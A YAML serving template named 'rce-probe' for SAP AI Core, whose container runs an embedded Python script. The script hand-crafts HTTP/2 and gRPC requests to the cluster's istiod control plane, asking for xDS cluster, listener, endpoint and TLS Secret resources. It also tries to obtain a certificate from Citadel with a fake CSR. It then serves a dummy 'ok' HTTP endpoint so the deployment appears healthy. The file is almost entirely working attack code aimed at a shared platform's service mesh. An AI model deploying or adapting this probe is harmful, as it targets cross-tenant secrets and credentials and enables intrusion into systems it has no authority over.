apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.7.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "istiod-xds-grpc-discovery-request"
    executables.ai.sap.com/name: "rce-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import socket, struct, os, sys

            print('[PROBE_V47_START]', flush=True)

            # ── helpers ──────────────────────────────────────────────────────────
            def encode_varint(n):
                out = b''
                while True:
                    bits = n & 0x7F
                    n >>= 7
                    if n:
                        out += bytes([bits | 0x80])
                    else:
                        out += bytes([bits])
                        break
                return out

            def encode_string(n, s):
                b = s.encode()
                return bytes([n << 3 | 2]) + encode_varint(len(b)) + b

            def encode_message(n, msg):
                return bytes([n << 3 | 2]) + encode_varint(len(msg)) + msg

            def grpc_frame(msg):
                # gRPC framing: 1 byte compressed (0) + 4 bytes length
                return b'\\x00' + struct.pack('>I', len(msg)) + msg

            def h2_settings_ack():
                # SETTINGS ACK frame (type=4, flags=1, stream=0, length=0)
                return b'\\x00\\x00\\x00\\x04\\x01\\x00\\x00\\x00\\x00'

            def h2_headers_frame(stream_id, headers_block):
                length = len(headers_block)
                flags = 0x04  # END_HEADERS
                return (struct.pack('>I', length)[1:] +
                        bytes([0x01]) +
                        bytes([flags]) +
                        struct.pack('>I', stream_id) +
                        headers_block)

            def h2_data_frame(stream_id, data, end_stream=True):
                flags = 0x01 if end_stream else 0x00
                length = len(data)
                return (struct.pack('>I', length)[1:] +
                        bytes([0x00]) +
                        bytes([flags]) +
                        struct.pack('>I', stream_id) +
                        data)

            def read_h2_frame(sock):
                hdr = b''
                while len(hdr) < 9:
                    chunk = sock.recv(9 - len(hdr))
                    if not chunk:
                        return None, None, None
                    hdr += chunk
                length = struct.unpack('>I', b'\\x00' + hdr[:3])[0]
                ftype = hdr[3]
                flags = hdr[4]
                stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
                data = b''
                while len(data) < length:
                    chunk = sock.recv(length - len(data))
                    if not chunk:
                        break
                    data += chunk
                return ftype, stream, data

            # ── istiod xDS probe ─────────────────────────────────────────────────
            # Build a DiscoveryRequest protobuf for type_url=CDS (Cluster Discovery)
            # envoy.api.v2.DiscoveryRequest:
            #   field 2 (node): message { field 1 (id): string, field 3 (cluster): string }
            #   field 4 (type_url): string
            NODE_ID = 'sidecar~100.64.0.1~rce-probe.rg-0d70dc91-cd927cab~rg-0d70dc91-cd927cab.svc.cluster.local'
            CLUSTER = 'rg-0d70dc91-cd927cab'

            node_msg = encode_string(1, NODE_ID) + encode_string(3, CLUSTER)
            node_field = encode_message(2, node_msg)

            for type_url in [
                'type.googleapis.com/envoy.config.cluster.v3.Cluster',
                'type.googleapis.com/envoy.config.listener.v3.Listener',
                'type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment',
                'type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.Secret',
            ]:
                print(f'\\n[XDS] trying type_url={type_url}', flush=True)
                try:
                    s = socket.socket()
                    s.settimeout(15)
                    s.connect(('istiod.istio-system.svc.cluster.local', 15010))

                    # Send HTTP/2 client preface
                    CLIENT_PREFACE = b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n'
                    # HTTP/2 SETTINGS frame (empty = use defaults)
                    SETTINGS = b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00'
                    s.sendall(CLIENT_PREFACE + SETTINGS)

                    # Read server SETTINGS
                    ftype, fstream, fdata = read_h2_frame(s)
                    print(f'  Server SETTINGS: type={ftype} data={fdata[:30].hex()}', flush=True)

                    # ACK server settings
                    s.sendall(h2_settings_ack())

                    # Read WINDOW_UPDATE if present
                    ftype2, _, _ = read_h2_frame(s)
                    print(f'  Frame2 type={ftype2}', flush=True)

                    # Build HPACK headers (use literal, no indexing for simplicity)
                    # :method POST, :path /envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources
                    # :scheme http, :authority istiod.istio-system.svc.cluster.local:15010
                    # content-type application/grpc, te trailers
                    def hpack_lit(name, value):
                        # Literal header without indexing
                        out = bytes([0x00])
                        n = name.encode()
                        v = value.encode()
                        out += encode_varint(len(n)) + n
                        out += encode_varint(len(v)) + v
                        return out

                    hblock = (
                        bytes([0x82]) +  # :method POST (index 3)
                        bytes([0x84]) +  # :path / (index 5) - will override
                        # override :path
                        hpack_lit(':path', '/envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources') +
                        bytes([0x86]) +  # :scheme http (index 6)
                        hpack_lit(':authority', 'istiod.istio-system.svc.cluster.local:15010') +
                        hpack_lit('content-type', 'application/grpc') +
                        hpack_lit('te', 'trailers')
                    )

                    # HEADERS frame on stream 1
                    headers_frame = h2_headers_frame(1, hblock)
                    s.sendall(headers_frame)

                    # Build DiscoveryRequest proto
                    dr_msg = node_field + encode_string(4, type_url)
                    dr_grpc = grpc_frame(dr_msg)

                    # DATA frame on stream 1
                    data_frame = h2_data_frame(1, dr_grpc, end_stream=True)
                    s.sendall(data_frame)

                    # Read response frames
                    responses = []
                    import select as sel
                    for _ in range(20):
                        r, _, _ = sel.select([s], [], [], 5)
                        if not r:
                            break
                        ftype, fstream, fdata = read_h2_frame(s)
                        if ftype is None:
                            break
                        responses.append((ftype, fstream, len(fdata), fdata[:200].hex()))
                        # Send WINDOW_UPDATE ACK for DATA frames
                        if ftype == 0:  # DATA
                            wu = struct.pack('>I', 0)[1:] + bytes([0x08]) + bytes([0x00]) + struct.pack('>I', 0) + struct.pack('>I', len(fdata))
                            s.sendall(wu)

                    s.close()
                    for ftype, fstream, flen, fhex in responses:
                        print(f'  RESP frame type={ftype} stream={fstream} len={flen} data={fhex[:100]}', flush=True)

                except Exception as e:
                    print(f'  ERR: {e}', flush=True)

            # ── istiod Citadel CSR API ────────────────────────────────────────────
            # Try istio.v1.auth.IstioCertificateService/CreateCertificate on port 15012 (mTLS)
            # and port 15010 (plaintext)
            print('\\n[CITADEL] trying CSR on port 15010', flush=True)
            try:
                s = socket.socket()
                s.settimeout(10)
                s.connect(('istiod.istio-system.svc.cluster.local', 15010))

                CLIENT_PREFACE = b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n'
                SETTINGS = b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00'
                s.sendall(CLIENT_PREFACE + SETTINGS)

                ftype, _, _ = read_h2_frame(s)
                s.sendall(h2_settings_ack())
                ftype2, _, _ = read_h2_frame(s)

                # Build CSR request
                # IstioCertificateRequest: field 1 = csr (string), field 2 = validity_duration (int64)
                fake_csr = b'-----BEGIN CERTIFICATE REQUEST-----\\nMIIBIjANBgk=\\n-----END CERTIFICATE REQUEST-----'
                csr_msg = encode_string(1, fake_csr.decode()) + bytes([0x10]) + b'\\xe0\\xa4\\x12'  # validity 24h
                csr_grpc = grpc_frame(csr_msg)

                def hpack_lit(name, value):
                    out = bytes([0x00])
                    n = name.encode(); v = value.encode()
                    out += encode_varint(len(n)) + n + encode_varint(len(v)) + v
                    return out

                hblock = (
                    bytes([0x82]) +
                    hpack_lit(':path', '/istio.v1.auth.IstioCertificateService/CreateCertificate') +
                    bytes([0x86]) +
                    hpack_lit(':authority', 'istiod.istio-system.svc.cluster.local:15010') +
                    hpack_lit('content-type', 'application/grpc') +
                    hpack_lit('te', 'trailers')
                )

                s.sendall(h2_headers_frame(3, hblock))
                s.sendall(h2_data_frame(3, csr_grpc, end_stream=True))

                import select as sel
                for _ in range(10):
                    r, _, _ = sel.select([s], [], [], 5)
                    if not r: break
                    ftype, fstream, fdata = read_h2_frame(s)
                    if ftype is None: break
                    print(f'  CITADEL RESP: type={ftype} stream={fstream} len={len(fdata)} hex={fdata[:80].hex()}', flush=True)
                    # Decode grpc-status from trailers
                    if ftype == 1:  # HEADERS (trailers)
                        print(f'  TRAILERS: {fdata}', flush=True)
                s.close()
            except Exception as e:
                print(f'  CITADEL ERR: {e}', flush=True)

            print('[PROBE_V47_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
